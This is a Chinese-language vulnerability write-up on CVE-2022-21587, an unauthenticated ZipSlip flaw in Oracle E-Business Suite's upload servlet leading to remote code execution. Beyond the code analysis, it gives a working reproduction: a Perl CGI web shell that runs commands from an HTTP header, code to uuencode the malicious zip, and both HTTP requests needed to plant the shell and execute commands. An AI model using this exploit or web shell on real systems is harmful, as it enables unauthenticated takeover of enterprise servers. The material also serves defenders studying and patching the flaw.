CVE-2022-21587 pre-auth ZipSlip -> RCE
--- 

#### 漏洞分析
web.xml

```xml
<servlet>
  <servlet-name>BneUploaderService</servlet-name>
  <servlet-class>oracle.apps.bne.integrator.upload.BneUploaderService</servlet-class>
</servlet>

<servlet-mapping>
  <servlet-name>BneUploaderService</servlet-name>
  <url-pattern>/BneUploaderService</url-pattern>
</servlet-mapping>
```

BneUploaderService 的父类 BneAbstractXMLServlet 在处理文件上传包时会调用 BneUnZip#doUnZip 进行解压处理


```java
public String doUnZip(String var1) throws IOException {
    new String("");
    String var3 = new String("");
    BneContext.getLogInstance().log(7, "BneUnZip.doUpZip Enter fileName: " + var1);
    String var2 = BneSitePropertyManager.getInstance().getProperty("BNE_UPLOAD_STAGING_DIRECTORY");

    try {
        BufferedOutputStream var4 = null;
        FileInputStream var5 = new FileInputStream(var1);
        ZipInputStream var6 = new ZipInputStream(new BufferedInputStream(var5));

        ZipEntry var7;
        while((var7 = var6.getNextEntry()) != null) {
            byte[] var8 = new byte[2048];
            var3 = var2 + System.getProperty("file.separator") + var7.getName();
            // 漏洞点 entry.getName() 是可控的 -> zip slip
            FileOutputStream var10 = new FileOutputStream(var3);
```

需要注意的点: 解压前调用 BneDecoder#doDecode 进行解码(Unix-to-Unix encoding)，所以在生成 zip-slip 的文件后需要进行 uuencode 编码.

#### 漏洞复现

1、生成 uuencode 编码后的payload

- txkFNDWRR.pl
```perl
use CGI;
print CGI::header( -type => 'text/plain' );
my $cmd = CGI::http('HTTP_CMD');
print system($cmd);
exit;
```

ps: jdk 自带 uuencode 编码的实现, 关键代码:

```java
byte[] bytes = Files.readAllBytes(Paths.get(evilZipFile));
String payload = new UUEncoder(zipName).encodeBuffer(bytes);
```

![image](https://user-images.githubusercontent.com/55024146/216362687-707f41df-533b-4bb4-8981-c056ffd81f99.png)

2、第1个请求，通过 zipslip 覆盖 txkFNDWRR.pl

```http
POST /OA_HTML/BneViewerXMLService?bne:uueupload=TRUE HTTP/1.1
Host: apps.example.com:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZsMro0UsAQYLDZGv
Content-Length: 769

------WebKitFormBoundaryZsMro0UsAQYLDZGv
Content-Disposition: form-data; name="bne:uueupload"

TRUE
------WebKitFormBoundaryZsMro0UsAQYLDZGv
Content-Disposition: form-data; name="uploadfilename";filename="test.zip"

[payload]
------WebKitFormBoundaryZsMro0UsAQYLDZGv--

```

3、第2个请求，调用 CGI 执行命令并回显

```http
POST /OA_CGI/FNDWRR.exe HTTP/1.1
Host: apps.example.com:8000
cmd: pwd
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```

![image](https://user-images.githubusercontent.com/55024146/216365358-cdd610ee-108c-422b-b46c-e5c885facbc9.png)


详见: https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/
